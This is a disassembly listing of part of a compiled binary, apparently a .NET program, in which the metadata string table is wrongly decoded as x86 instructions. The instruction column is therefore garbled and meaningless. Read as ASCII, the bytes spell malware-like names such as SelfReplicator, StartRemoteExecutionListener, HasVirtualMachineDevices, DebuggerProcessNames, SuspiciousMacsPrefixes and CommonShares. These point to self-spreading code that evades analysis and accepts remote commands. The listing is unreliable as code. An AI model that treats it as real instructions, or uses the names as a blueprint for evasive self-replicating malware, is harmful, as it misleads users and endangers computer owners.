  408624:	00 46 69             	add    %al,0x69(%esi)
  408627:	6c                   	insb   (%dx),%es:(%edi)
  408628:	65 53                	gs push %ebx
  40862a:	79 73                	jns    0x40869f
  40862c:	74 65                	je     0x408693
  40862e:	6d                   	insl   (%dx),%es:(%edi)
  40862f:	49                   	dec    %ecx
  408630:	6e                   	outsb  %ds:(%esi),(%dx)
  408631:	66 6f                	outsw  %ds:(%esi),(%dx)
  408633:	00 67 65             	add    %ah,0x65(%edi)
  408636:	74 5f                	je     0x408697
  408638:	53                   	push   %ebx
  408639:	74 61                	je     0x40869c
  40863b:	72 74                	jb     0x4086b1
  40863d:	49                   	dec    %ecx
  40863e:	6e                   	outsb  %ds:(%esi),(%dx)
  40863f:	66 6f                	outsw  %ds:(%esi),(%dx)
  408641:	00 50 72             	add    %dl,0x72(%eax)
  408644:	6f                   	outsl  %ds:(%esi),(%dx)
  408645:	63 65 73             	arpl   %esp,0x73(%ebp)
  408648:	73 53                	jae    0x40869d
  40864a:	74 61                	je     0x4086ad
  40864c:	72 74                	jb     0x4086c2
  40864e:	49                   	dec    %ecx
  40864f:	6e                   	outsb  %ds:(%esi),(%dx)
  408650:	66 6f                	outsw  %ds:(%esi),(%dx)
  408652:	00 44 69 72          	add    %al,0x72(%ecx,%ebp,2)
  408656:	65 63 74 6f 72       	arpl   %esi,%gs:0x72(%edi,%ebp,2)
  40865b:	79 49                	jns    0x4086a6
  40865d:	6e                   	outsb  %ds:(%esi),(%dx)
  40865e:	66 6f                	outsw  %ds:(%esi),(%dx)
  408660:	00 5a 65             	add    %bl,0x65(%edx)
  408663:	72 6f                	jb     0x4086d4
  408665:	00 53 6c             	add    %dl,0x6c(%ebx)
  408668:	65 65 70 00          	gs gs jo 0x40866c
  40866c:	69 70 00 53 70 69 6b 	imul   $0x6b697053,0x0(%eax),%esi
  408673:	65 4c                	gs dec %esp
  408675:	6f                   	outsl  %ds:(%esi),(%dx)
  408676:	6f                   	outsl  %ds:(%esi),(%dx)
  408677:	70 00                	jo     0x408679
  408679:	53                   	push   %ebx
  40867a:	74 6f                	je     0x4086eb
  40867c:	70 00                	jo     0x40867e
  40867e:	53                   	push   %ebx
  40867f:	79 73                	jns    0x4086f4
  408681:	74 65                	je     0x4086e8
  408683:	6d                   	insl   (%dx),%es:(%edi)
  408684:	2e 4c                	cs dec %esp
  408686:	69 6e 71 00 43 68 61 	imul   $0x61684300,0x71(%esi),%ebp
  40868d:	72 00                	jb     0x40868f
  40868f:	6d                   	insl   (%dx),%es:(%edi)
  408690:	61                   	popa
  408691:	63 41 64             	arpl   %eax,0x64(%ecx)
  408694:	64 72 00             	fs jb  0x408697
  408697:	53                   	push   %ebx
  408698:	74 72                	je     0x40870c
  40869a:	65 61                	gs popa
  40869c:	6d                   	insl   (%dx),%es:(%edi)
  40869d:	52                   	push   %edx
  40869e:	65 61                	gs popa
  4086a0:	64 65 72 00          	fs gs jb 0x4086a4
  4086a4:	54                   	push   %esp
  4086a5:	65 78 74             	gs js  0x40871c
  4086a8:	52                   	push   %edx
  4086a9:	65 61                	gs popa
  4086ab:	64 65 72 00          	fs gs jb 0x4086af
  4086af:	41                   	inc    %ecx
  4086b0:	73 79                	jae    0x40872b
  4086b2:	6e                   	outsb  %ds:(%esi),(%dx)
  4086b3:	63 54 61 73          	arpl   %edx,0x73(%ecx,%eiz,2)
  4086b7:	6b 4d 65 74          	imul   $0x74,0x65(%ebp),%ecx
  4086bb:	68 6f 64 42 75       	push   $0x7542646f
  4086c0:	69 6c 64 65 72 00 3c 	imul   $0x3e3c0072,0x65(%esp,%eiz,2),%ebp
  4086c7:	3e 
  4086c8:	74 5f                	je     0x408729
  4086ca:	5f                   	pop    %edi
  4086cb:	62 75 69             	bound  %esi,0x69(%ebp)
  4086ce:	6c                   	insb   (%dx),%es:(%edi)
  4086cf:	64 65 72 00          	fs gs jb 0x4086d3
  4086d3:	53                   	push   %ebx
  4086d4:	70 65                	jo     0x40873b
  4086d6:	63 69 61             	arpl   %ebp,0x61(%ecx)
  4086d9:	6c                   	insb   (%dx),%es:(%edi)
  4086da:	46                   	inc    %esi
  4086db:	6f                   	outsl  %ds:(%esi),(%dx)
  4086dc:	6c                   	insb   (%dx),%es:(%edi)
  4086dd:	64 65 72 00          	fs gs jb 0x4086e1
  4086e1:	62 75 66             	bound  %esi,0x66(%ebp)
  4086e4:	66 65 72 00          	data16 gs jb 0x4086e8
  4086e8:	44                   	inc    %esp
  4086e9:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  4086ed:	67 65 72 00          	addr16 gs jb 0x4086f1
  4086f1:	4d                   	dec    %ebp
  4086f2:	61                   	popa
  4086f3:	6e                   	outsb  %ds:(%esi),(%dx)
  4086f4:	61                   	popa
  4086f5:	67 65 6d             	gs insl (%dx),%es:(%di)
  4086f8:	65 6e                	outsb  %gs:(%esi),(%dx)
  4086fa:	74 4f                	je     0x40874b
  4086fc:	62 6a 65             	bound  %ebp,0x65(%edx)
  4086ff:	63 74 53 65          	arpl   %esi,0x65(%ebx,%edx,2)
  408703:	61                   	popa
  408704:	72 63                	jb     0x408769
  408706:	68 65 72 00 74       	push   $0x74007265
  40870b:	68 72 6f 74 74       	push   $0x74746f72
  408710:	6c                   	insb   (%dx),%es:(%edi)
  408711:	65 72 00             	gs jb  0x408714
  408714:	53                   	push   %ebx
  408715:	74 61                	je     0x408778
  408717:	72 74                	jb     0x40878d
  408719:	52                   	push   %edx
  40871a:	65 6d                	gs insl (%dx),%es:(%edi)
  40871c:	6f                   	outsl  %ds:(%esi),(%dx)
  40871d:	74 65                	je     0x408784
  40871f:	45                   	inc    %ebp
  408720:	78 65                	js     0x408787
  408722:	63 75 74             	arpl   %esi,0x74(%ebp)
  408725:	69 6f 6e 4c 69 73 74 	imul   $0x7473694c,0x6e(%edi),%ebp
  40872c:	65 6e                	outsb  %gs:(%esi),(%dx)
  40872e:	65 72 00             	gs jb  0x408731
  408731:	54                   	push   %esp
  408732:	63 70 4c             	arpl   %esi,0x4c(%eax)
  408735:	69 73 74 65 6e 65 72 	imul   $0x72656e65,0x74(%ebx),%esi
  40873c:	00 53 74             	add    %dl,0x74(%ebx)
  40873f:	6f                   	outsl  %ds:(%esi),(%dx)
  408740:	70 4c                	jo     0x40878e
  408742:	69 73 74 65 6e 65 72 	imul   $0x72656e65,0x74(%ebx),%esi
  408749:	00 48 74             	add    %cl,0x74(%eax)
  40874c:	74 70                	je     0x4087be
  40874e:	4c                   	dec    %esp
  40874f:	69 73 74 65 6e 65 72 	imul   $0x72656e65,0x74(%ebx),%esi
  408756:	00 6c 69 73          	add    %ch,0x73(%ecx,%ebp,2)
  40875a:	74 65                	je     0x4087c1
  40875c:	6e                   	outsb  %ds:(%esi),(%dx)
  40875d:	65 72 00             	gs jb  0x408760
  408760:	6d                   	insl   (%dx),%es:(%edi)
  408761:	61                   	popa
  408762:	6e                   	outsb  %ds:(%esi),(%dx)
  408763:	75 66                	jne    0x4087cb
  408765:	61                   	popa
  408766:	63 74 75 72          	arpl   %esi,0x72(%ebp,%esi,2)
  40876a:	65 72 00             	gs jb  0x40876d
  40876d:	61                   	popa
  40876e:	64 6d                	fs insl (%dx),%es:(%edi)
  408770:	69 6e 55 73 65 72 00 	imul   $0x726573,0x55(%esi),%ebp
  408777:	43                   	inc    %ebx
  408778:	75 72                	jne    0x4087ec
  40877a:	72 65                	jb     0x4087e1
  40877c:	6e                   	outsb  %ds:(%esi),(%dx)
  40877d:	74 55                	je     0x4087d4
  40877f:	73 65                	jae    0x4087e6
  408781:	72 00                	jb     0x408783
  408783:	6c                   	insb   (%dx),%es:(%edi)
  408784:	70 50                	jo     0x4087d6
  408786:	61                   	popa
  408787:	72 61                	jb     0x4087ea
  408789:	6d                   	insl   (%dx),%es:(%edi)
  40878a:	65 74 65             	gs je  0x4087f2
  40878d:	72 00                	jb     0x40878f
  40878f:	54                   	push   %esp
  408790:	61                   	popa
  408791:	73 6b                	jae    0x4087fe
  408793:	41                   	inc    %ecx
  408794:	77 61                	ja     0x4087f7
  408796:	69 74 65 72 00 47 65 	imul   $0x74654700,0x72(%ebp,%eiz,2),%esi
  40879d:	74 
  40879e:	41                   	inc    %ecx
  40879f:	77 61                	ja     0x408802
  4087a1:	69 74 65 72 00 53 74 	imul   $0x72745300,0x72(%ebp,%eiz,2),%esi
  4087a8:	72 
  4087a9:	65 61                	gs popa
  4087ab:	6d                   	insl   (%dx),%es:(%edi)
  4087ac:	57                   	push   %edi
  4087ad:	72 69                	jb     0x408818
  4087af:	74 65                	je     0x408816
  4087b1:	72 00                	jb     0x4087b3
  4087b3:	54                   	push   %esp
  4087b4:	65 78 74             	gs js  0x40882b
  4087b7:	57                   	push   %edi
  4087b8:	72 69                	jb     0x408823
  4087ba:	74 65                	je     0x408821
  4087bc:	72 00                	jb     0x4087be
  4087be:	45                   	inc    %ebp
  4087bf:	6e                   	outsb  %ds:(%esi),(%dx)
  4087c0:	74 65                	je     0x408827
  4087c2:	72 00                	jb     0x4087c4
  4087c4:	54                   	push   %esp
  4087c5:	6f                   	outsl  %ds:(%esi),(%dx)
  4087c6:	4c                   	dec    %esp
  4087c7:	6f                   	outsl  %ds:(%esi),(%dx)
  4087c8:	77 65                	ja     0x40882f
  4087ca:	72 00                	jb     0x4087cc
  4087cc:	77 6f                	ja     0x40883d
  4087ce:	72 6b                	jb     0x40883b
  4087d0:	69 6e 67 44 69 72 00 	imul   $0x726944,0x67(%esi),%ebp
  4087d7:	73 65                	jae    0x40883e
  4087d9:	74 5f                	je     0x40883a
  4087db:	46                   	inc    %esi
  4087dc:	6f                   	outsl  %ds:(%esi),(%dx)
  4087dd:	72 65                	jb     0x408844
  4087df:	67 72 6f             	addr16 jb 0x408851
  4087e2:	75 6e                	jne    0x408852
  4087e4:	64 43                	fs inc %ebx
  4087e6:	6f                   	outsl  %ds:(%esi),(%dx)
  4087e7:	6c                   	insb   (%dx),%es:(%edi)
  4087e8:	6f                   	outsl  %ds:(%esi),(%dx)
  4087e9:	72 00                	jb     0x4087eb
  4087eb:	43                   	inc    %ebx
  4087ec:	6f                   	outsl  %ds:(%esi),(%dx)
  4087ed:	6e                   	outsb  %ds:(%esi),(%dx)
  4087ee:	73 6f                	jae    0x40885f
  4087f0:	6c                   	insb   (%dx),%es:(%edi)
  4087f1:	65 43                	gs inc %ebx
  4087f3:	6f                   	outsl  %ds:(%esi),(%dx)
  4087f4:	6c                   	insb   (%dx),%es:(%edi)
  4087f5:	6f                   	outsl  %ds:(%esi),(%dx)
  4087f6:	72 00                	jb     0x4087f8
  4087f8:	52                   	push   %edx
  4087f9:	65 73 65             	gs jae 0x408861
  4087fc:	74 43                	je     0x408841
  4087fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4087ff:	6c                   	insb   (%dx),%es:(%edi)
  408800:	6f                   	outsl  %ds:(%esi),(%dx)
  408801:	72 00                	jb     0x408803
  408803:	67 65 74 5f          	addr16 gs je 0x408866
  408807:	53                   	push   %ebx
  408808:	74 61                	je     0x40886b
  40880a:	6e                   	outsb  %ds:(%esi),(%dx)
  40880b:	64 61                	fs popa
  40880d:	72 64                	jb     0x408873
  40880f:	45                   	inc    %ebp
  408810:	72 72                	jb     0x408884
  408812:	6f                   	outsl  %ds:(%esi),(%dx)
  408813:	72 00                	jb     0x408815
  408815:	73 65                	jae    0x40887c
  408817:	74 5f                	je     0x408878
  408819:	52                   	push   %edx
  40881a:	65 64 69 72 65 63 74 	gs imul $0x74537463,%fs:0x65(%edx),%esi
  408821:	53 74 
  408823:	61                   	popa
  408824:	6e                   	outsb  %ds:(%esi),(%dx)
  408825:	64 61                	fs popa
  408827:	72 64                	jb     0x40888d
  408829:	45                   	inc    %ebp
  40882a:	72 72                	jb     0x40889e
  40882c:	6f                   	outsl  %ds:(%esi),(%dx)
  40882d:	72 00                	jb     0x40882f
  40882f:	53                   	push   %ebx
  408830:	65 6c                	gs insb (%dx),%es:(%edi)
  408832:	66 52                	push   %dx
  408834:	65 70 6c             	gs jo  0x4088a3
  408837:	69 63 61 74 6f 72 00 	imul   $0x726f74,0x61(%ebx),%esp
  40883e:	4d                   	dec    %ebp
  40883f:	61                   	popa
  408840:	6e                   	outsb  %ds:(%esi),(%dx)
  408841:	61                   	popa
  408842:	67 65 6d             	gs insl (%dx),%es:(%di)
  408845:	65 6e                	outsb  %gs:(%esi),(%dx)
  408847:	74 4f                	je     0x408898
  408849:	62 6a 65             	bound  %ebp,0x65(%edx)
  40884c:	63 74 45 6e          	arpl   %esi,0x6e(%ebp,%eax,2)
  408850:	75 6d                	jne    0x4088bf
  408852:	65 72 61             	gs jb  0x4088b6
  408855:	74 6f                	je     0x4088c6
  408857:	72 00                	jb     0x408859
  408859:	47                   	inc    %edi
  40885a:	65 74 45             	gs je  0x4088a2
  40885d:	6e                   	outsb  %ds:(%esi),(%dx)
  40885e:	75 6d                	jne    0x4088cd
  408860:	65 72 61             	gs jb  0x4088c4
  408863:	74 6f                	je     0x4088d4
  408865:	72 00                	jb     0x408867
  408867:	49                   	dec    %ecx
  408868:	73 41                	jae    0x4088ab
  40886a:	64 6d                	fs insl (%dx),%es:(%edi)
  40886c:	69 6e 69 73 74 72 61 	imul   $0x61727473,0x69(%esi),%ebp
  408873:	74 6f                	je     0x4088e4
  408875:	72 00                	jb     0x408877
  408877:	2e 63 74 6f 72       	arpl   %esi,%cs:0x72(%edi,%ebp,2)
  40887c:	00 2e                	add    %ch,(%esi)
  40887e:	63 63 74             	arpl   %esp,0x74(%ebx)
  408881:	6f                   	outsl  %ds:(%esi),(%dx)
  408882:	72 00                	jb     0x408884
  408884:	4d                   	dec    %ebp
  408885:	6f                   	outsl  %ds:(%esi),(%dx)
  408886:	6e                   	outsb  %ds:(%esi),(%dx)
  408887:	69 74 6f 72 00 55 49 	imul   $0x6e495500,0x72(%edi,%ebp,2),%esi
  40888e:	6e 
  40888f:	74 50                	je     0x4088e1
  408891:	74 72                	je     0x408905
  408893:	00 53 79             	add    %dl,0x79(%ebx)
  408896:	73 74                	jae    0x40890c
  408898:	65 6d                	gs insl (%dx),%es:(%edi)
  40889a:	2e 44                	cs inc %esp
  40889c:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
  4088a3:	69 63 73 00 46 72 6f 	imul   $0x6f724600,0x73(%ebx),%esp
  4088aa:	6d                   	insl   (%dx),%es:(%edi)
  4088ab:	53                   	push   %ebx
  4088ac:	65 63 6f 6e          	arpl   %ebp,%gs:0x6e(%edi)
  4088b0:	64 73 00             	fs jae 0x4088b3
  4088b3:	41                   	inc    %ecx
  4088b4:	64 64 4d             	fs fs dec %ebp
  4088b7:	69 6c 6c 69 73 65 63 	imul   $0x6f636573,0x69(%esp,%ebp,2),%ebp
  4088be:	6f 
  4088bf:	6e                   	outsb  %ds:(%esi),(%dx)
  4088c0:	64 73 00             	fs jae 0x4088c3
  4088c3:	67 65 74 5f          	addr16 gs je 0x408926
  4088c7:	45                   	inc    %ebp
  4088c8:	6c                   	insb   (%dx),%es:(%edi)
  4088c9:	61                   	popa
  4088ca:	70 73                	jo     0x40893f
  4088cc:	65 64 4d             	gs fs dec %ebp
  4088cf:	69 6c 6c 69 73 65 63 	imul   $0x6f636573,0x69(%esp,%ebp,2),%ebp
  4088d6:	6f 
  4088d7:	6e                   	outsb  %ds:(%esi),(%dx)
  4088d8:	64 73 00             	fs jae 0x4088db
  4088db:	47                   	inc    %edi
  4088dc:	65 74 41             	gs je  0x408920
  4088df:	6c                   	insb   (%dx),%es:(%edi)
  4088e0:	6c                   	insb   (%dx),%es:(%edi)
  4088e1:	4e                   	dec    %esi
  4088e2:	65 74 77             	gs je  0x40895c
  4088e5:	6f                   	outsl  %ds:(%esi),(%dx)
  4088e6:	72 6b                	jb     0x408953
  4088e8:	49                   	dec    %ecx
  4088e9:	6e                   	outsb  %ds:(%esi),(%dx)
  4088ea:	74 65                	je     0x408951
  4088ec:	72 66                	jb     0x408954
  4088ee:	61                   	popa
  4088ef:	63 65 73             	arpl   %esp,0x73(%ebp)
  4088f2:	00 48 61             	add    %cl,0x61(%eax)
  4088f5:	73 56                	jae    0x40894d
  4088f7:	69 72 74 75 61 6c 4d 	imul   $0x4d6c6175,0x74(%edx),%esi
  4088fe:	61                   	popa
  4088ff:	63 68 69             	arpl   %ebp,0x69(%eax)
  408902:	6e                   	outsb  %ds:(%esi),(%dx)
  408903:	65 44                	gs inc %esp
  408905:	65 76 69             	gs jbe 0x408971
  408908:	63 65 73             	arpl   %esp,0x73(%ebp)
  40890b:	00 53 79             	add    %dl,0x79(%ebx)
  40890e:	73 74                	jae    0x408984
  408910:	65 6d                	gs insl (%dx),%es:(%edi)
  408912:	2e 52                	cs push %edx
  408914:	75 6e                	jne    0x408984
  408916:	74 69                	je     0x408981
  408918:	6d                   	insl   (%dx),%es:(%edi)
  408919:	65 2e 45             	gs cs inc %ebp
  40891c:	78 63                	js     0x408981
  40891e:	65 70 74             	gs jo  0x408995
  408921:	69 6f 6e 53 65 72 76 	imul   $0x76726553,0x6e(%edi),%ebp
  408928:	69 63 65 73 00 53 79 	imul   $0x79530073,0x65(%ebx),%esp
  40892f:	73 74                	jae    0x4089a5
  408931:	65 6d                	gs insl (%dx),%es:(%edi)
  408933:	2e 52                	cs push %edx
  408935:	75 6e                	jne    0x4089a5
  408937:	74 69                	je     0x4089a2
  408939:	6d                   	insl   (%dx),%es:(%edi)
  40893a:	65 2e 49             	gs cs dec %ecx
  40893d:	6e                   	outsb  %ds:(%esi),(%dx)
  40893e:	74 65                	je     0x4089a5
  408940:	72 6f                	jb     0x4089b1
  408942:	70 53                	jo     0x408997
  408944:	65 72 76             	gs jb  0x4089bd
  408947:	69 63 65 73 00 53 79 	imul   $0x79530073,0x65(%ebx),%esp
  40894e:	73 74                	jae    0x4089c4
  408950:	65 6d                	gs insl (%dx),%es:(%edi)
  408952:	2e 52                	cs push %edx
  408954:	75 6e                	jne    0x4089c4
  408956:	74 69                	je     0x4089c1
  408958:	6d                   	insl   (%dx),%es:(%edi)
  408959:	65 2e 43             	gs cs inc %ebx
  40895c:	6f                   	outsl  %ds:(%esi),(%dx)
  40895d:	6d                   	insl   (%dx),%es:(%edi)
  40895e:	70 69                	jo     0x4089c9
  408960:	6c                   	insb   (%dx),%es:(%edi)
  408961:	65 72 53             	gs jb  0x4089b7
  408964:	65 72 76             	gs jb  0x4089dd
  408967:	69 63 65 73 00 48 61 	imul   $0x61480073,0x65(%ebx),%esp
  40896e:	73 4c                	jae    0x4089bc
  408970:	6f                   	outsl  %ds:(%esi),(%dx)
  408971:	77 48                	ja     0x4089bb
  408973:	61                   	popa
  408974:	72 64                	jb     0x4089da
  408976:	77 61                	ja     0x4089d9
  408978:	72 65                	jb     0x4089df
  40897a:	52                   	push   %edx
  40897b:	65 73 6f             	gs jae 0x4089ed
  40897e:	75 72                	jne    0x4089f2
  408980:	63 65 73             	arpl   %esp,0x73(%ebp)
  408983:	00 44 65 62          	add    %al,0x62(%ebp,%eiz,2)
  408987:	75 67                	jne    0x4089f0
  408989:	67 69 6e 67 4d 6f 64 	imul   $0x65646f4d,0x67(%bp),%ebp
  408990:	65 
  408991:	73 00                	jae    0x408993
  408993:	73 65                	jae    0x4089fa
  408995:	74 5f                	je     0x4089f6
  408997:	45                   	inc    %ebp
  408998:	6e                   	outsb  %ds:(%esi),(%dx)
  408999:	61                   	popa
  40899a:	62 6c 65 50          	bound  %ebp,0x50(%ebp,%eiz,2)
  40899e:	72 69                	jb     0x408a09
  4089a0:	76 69                	jbe    0x408a0b
  4089a2:	6c                   	insb   (%dx),%es:(%edi)
  4089a3:	65 67 65 73 00       	gs addr16 gs jae 0x4089a8
  4089a8:	43                   	inc    %ebx
  4089a9:	6c                   	insb   (%dx),%es:(%edi)
  4089aa:	65 61                	gs popa
  4089ac:	6e                   	outsb  %ds:(%esi),(%dx)
  4089ad:	4f                   	dec    %edi
  4089ae:	6c                   	insb   (%dx),%es:(%edi)
  4089af:	64 43                	fs inc %ebx
  4089b1:	6f                   	outsl  %ds:(%esi),(%dx)
  4089b2:	70 69                	jo     0x408a1d
  4089b4:	65 73 00             	gs jae 0x4089b7
  4089b7:	47                   	inc    %edi
  4089b8:	65 74 46             	gs je  0x408a01
  4089bb:	69 6c 65 73 00 47 65 	imul   $0x74654700,0x73(%ebp,%eiz,2),%ebp
  4089c2:	74 
  4089c3:	56                   	push   %esi
  4089c4:	61                   	popa
  4089c5:	6c                   	insb   (%dx),%es:(%edi)
  4089c6:	75 65                	jne    0x408a2d
  4089c8:	4e                   	dec    %esi
  4089c9:	61                   	popa
  4089ca:	6d                   	insl   (%dx),%es:(%edi)
  4089cb:	65 73 00             	gs jae 0x4089ce
  4089ce:	44                   	inc    %esp
  4089cf:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  4089d3:	67 65 72 50          	addr16 gs jb 0x408a27
  4089d7:	72 6f                	jb     0x408a48
  4089d9:	63 65 73             	arpl   %esp,0x73(%ebp)
  4089dc:	73 4e                	jae    0x408a2c
  4089de:	61                   	popa
  4089df:	6d                   	insl   (%dx),%es:(%edi)
  4089e0:	65 73 00             	gs jae 0x4089e3
  4089e3:	43                   	inc    %ebx
  4089e4:	6f                   	outsl  %ds:(%esi),(%dx)
  4089e5:	6d                   	insl   (%dx),%es:(%edi)
  4089e6:	6d                   	insl   (%dx),%es:(%edi)
  4089e7:	6f                   	outsl  %ds:(%esi),(%dx)
  4089e8:	6e                   	outsb  %ds:(%esi),(%dx)
  4089e9:	53                   	push   %ebx
  4089ea:	68 61 72 65 73       	push   $0x73657261
  4089ef:	00 47 65             	add    %al,0x65(%edi)
  4089f2:	74 50                	je     0x408a44
  4089f4:	72 6f                	jb     0x408a65
  4089f6:	63 65 73             	arpl   %esp,0x73(%ebp)
  4089f9:	73 65                	jae    0x408a60
  4089fb:	73 00                	jae    0x4089fd
  4089fd:	6c                   	insb   (%dx),%es:(%edi)
  4089fe:	70 54                	jo     0x408a54
  408a00:	68 72 65 61 64       	push   $0x64616572
  408a05:	41                   	inc    %ecx
  408a06:	74 74                	je     0x408a7c
  408a08:	72 69                	jb     0x408a73
  408a0a:	62 75 74             	bound  %esi,0x74(%ebp)
  408a0d:	65 73 00             	gs jae 0x408a10
  408a10:	46                   	inc    %esi
  408a11:	69 6c 65 41 74 74 72 	imul   $0x69727474,0x41(%ebp,%eiz,2),%ebp
  408a18:	69 
  408a19:	62 75 74             	bound  %esi,0x74(%ebp)
  408a1c:	65 73 00             	gs jae 0x408a1f
  408a1f:	53                   	push   %ebx
  408a20:	65 74 41             	gs je  0x408a64
  408a23:	74 74                	je     0x408a99
  408a25:	72 69                	jb     0x408a90
  408a27:	62 75 74             	bound  %esi,0x74(%ebp)
  408a2a:	65 73 00             	gs jae 0x408a2d
  408a2d:	52                   	push   %edx
  408a2e:	65 61                	gs popa
  408a30:	64 41                	fs inc %ecx
  408a32:	6c                   	insb   (%dx),%es:(%edi)
  408a33:	6c                   	insb   (%dx),%es:(%edi)
  408a34:	42                   	inc    %edx
  408a35:	79 74                	jns    0x408aab
  408a37:	65 73 00             	gs jae 0x408a3a
  408a3a:	47                   	inc    %edi
  408a3b:	65 74 42             	gs je  0x408a80
  408a3e:	79 74                	jns    0x408ab4
  408a40:	65 73 00             	gs jae 0x408a43
  408a43:	47                   	inc    %edi
  408a44:	65 74 4c             	gs je  0x408a93
  408a47:	6f                   	outsl  %ds:(%esi),(%dx)
  408a48:	67 69 63 61 6c 44 72 	imul   $0x6972446c,0x61(%bp,%di),%esp
  408a4f:	69 
  408a50:	76 65                	jbe    0x408ab7
  408a52:	73 00                	jae    0x408a54
  408a54:	47                   	inc    %edi
  408a55:	65 74 44             	gs je  0x408a9c
  408a58:	72 69                	jb     0x408ac3
  408a5a:	76 65                	jbe    0x408ac1
  408a5c:	73 00                	jae    0x408a5e
  408a5e:	67 65 74 5f          	addr16 gs je 0x408ac1
  408a62:	50                   	push   %eax
  408a63:	72 65                	jb     0x408aca
  408a65:	66 69 78 65 73 00    	imul   $0x73,0x65(%eax),%di
  408a6b:	53                   	push   %ebx
  408a6c:	75 73                	jne    0x408ae1
  408a6e:	70 69                	jo     0x408ad9
  408a70:	63 69 6f             	arpl   %ebp,0x6f(%ecx)
  408a73:	75 73                	jne    0x408ae8
  408a75:	4d                   	dec    %ebp
  408a76:	61                   	popa
  408a77:	63 73 50             	arpl   %esi,0x50(%ebx)
  408a7a:	72 65                	jb     0x408ae1
  408a7c:	66 69 78 65 73 00    	imul   $0x73,0x65(%eax),%di
  408a82:	64 77 43             	fs ja  0x408ac8
  408a85:	72 65                	jb     0x408aec
  408a87:	61                   	popa
  408a88:	74 69                	je     0x408af3
  408a8a:	6f                   	outsl  %ds:(%esi),(%dx)
  408a8b:	6e                   	outsb  %ds:(%esi),(%dx)
  408a8c:	46                   	inc    %esi
  408a8d:	6c                   	insb   (%dx),%es:(%edi)
  408a8e:	61                   	popa
  408a8f:	67 73 00             	addr16 jae 0x408a92
  408a92:	61                   	popa
  408a93:	72 67                	jb     0x408afc
  408a95:	73 00                	jae    0x408a97
  408a97:	54                   	push   %esp
  408a98:	61                   	popa
  408a99:	72 67                	jb     0x408b02
  408a9b:	65 74 50             	gs je  0x408aee
  408a9e:	61                   	popa
  408a9f:	74 68                	je     0x408b09
  408aa1:	73 00                	jae    0x408aa3
  408aa3:	3c 3e                	cmp    $0x3e,%al
  408aa5:	34 5f                	xor    $0x5f,%al
  408aa7:	5f                   	pop    %edi
  408aa8:	74 68                	je     0x408b12
  408aaa:	69 73 00 53 79 73 74 	imul   $0x74737953,0x0(%ebx),%esi
  408ab1:	65 6d                	gs insl (%dx),%es:(%edi)
  408ab3:	2e 54                	cs push %esp
  408ab5:	68 72 65 61 64       	push   $0x64616572
  408aba:	69 6e 67 2e 54 61 73 	imul   $0x7361542e,0x67(%esi),%ebp
  408ac1:	6b 73 00 4d          	imul   $0x4d,0x0(%ebx),%esi
  408ac5:	61                   	popa
  408ac6:	78 43                	js     0x408b0b
  408ac8:	6f                   	outsl  %ds:(%esi),(%dx)
  408ac9:	6e                   	outsb  %ds:(%esi),(%dx)
  408aca:	63 75 72             	arpl   %esi,0x72(%ebp)
  408acd:	72 65                	jb     0x408b34
  408acf:	6e                   	outsb  %ds:(%esi),(%dx)
  408ad0:	74 54                	je     0x408b26
  408ad2:	61                   	popa
  408ad3:	73 6b                	jae    0x408b40
  408ad5:	73 00                	jae    0x408ad7
  408ad7:	45                   	inc    %ebp
  408ad8:	71 75                	jno    0x408b4f
  408ada:	61                   	popa
  408adb:	6c                   	insb   (%dx),%es:(%edi)
  408adc:	73 00                	jae    0x408ade
  408ade:	56                   	push   %esi
  408adf:	69 72 74 75 61 6c 4d 	imul   $0x4d6c6175,0x74(%edx),%esi
  408ae6:	61                   	popa
  408ae7:	63 68 69             	arpl   %ebp,0x69(%eax)
  408aea:	6e                   	outsb  %ds:(%esi),(%dx)
  408aeb:	65 73 4d             	gs jae 0x408b3b
  408aee:	6f                   	outsl  %ds:(%esi),(%dx)
  408aef:	64 65 6c             	fs gs insb (%dx),%es:(%edi)
  408af2:	73 00                	jae    0x408af4
  408af4:	44                   	inc    %esp
  408af5:	6e                   	outsb  %ds:(%esi),(%dx)
  408af6:	73 00                	jae    0x408af8
  408af8:	43                   	inc    %ebx
  408af9:	6f                   	outsl  %ds:(%esi),(%dx)
  408afa:	6e                   	outsb  %ds:(%esi),(%dx)
  408afb:	74 61                	je     0x408b5e
  408afd:	69 6e 73 00 53 79 73 	imul   $0x73795300,0x73(%esi),%ebp
  408b04:	74 65                	je     0x408b6b
  408b06:	6d                   	insl   (%dx),%es:(%edi)
  408b07:	2e 54                	cs push %esp
  408b09:	65 78 74             	gs js  0x408b80
  408b0c:	2e 52                	cs push %edx
  408b0e:	65 67 75 6c          	gs addr16 jne 0x408b7e
  408b12:	61                   	popa
  408b13:	72 45                	jb     0x408b5a
  408b15:	78 70                	js     0x408b87
  408b17:	72 65                	jb     0x408b7e
  408b19:	73 73                	jae    0x408b8e
  408b1b:	69 6f 6e 73 00 53 79 	imul   $0x79530073,0x6e(%edi),%ebp
  408b22:	73 74                	jae    0x408b98
  408b24:	65 6d                	gs insl (%dx),%es:(%edi)
  408b26:	2e 53                	cs push %ebx
  408b28:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  408b2c:	69 74 79 2e 50 65 72 	imul   $0x6d726550,0x2e(%ecx,%edi,2),%esi
  408b33:	6d 
  408b34:	69 73 73 69 6f 6e 73 	imul   $0x736e6f69,0x73(%ebx),%esi
  408b3b:	00 49 6e             	add    %cl,0x6e(%ecx)
  408b3e:	76 6f                	jbe    0x408baf
  408b40:	6b 65 4d 65          	imul   $0x65,0x4d(%ebp),%esp
  408b44:	74 68                	je     0x408bae
  408b46:	6f                   	outsl  %ds:(%esi),(%dx)
  408b47:	64 4f                	fs dec %edi
  408b49:	70 74                	jo     0x408bbf
  408b4b:	69 6f 6e 73 00 43 6f 	imul   $0x6f430073,0x6e(%edi),%ebp
  408b52:	6e                   	outsb  %ds:(%esi),(%dx)
  408b53:	6e                   	outsb  %ds:(%esi),(%dx)
  408b54:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  408b59:	6e                   	outsb  %ds:(%esi),(%dx)
  408b5a:	4f                   	dec    %edi
  408b5b:	70 74                	jo     0x408bd1
  408b5d:	69 6f 6e 73 00 4f 62 	imul   $0x624f0073,0x6e(%edi),%ebp
  408b64:	6a 65                	push   $0x65
  408b66:	63 74 47 65          	arpl   %esi,0x65(%edi,%eax,2)
  408b6a:	74 4f                	je     0x408bbb
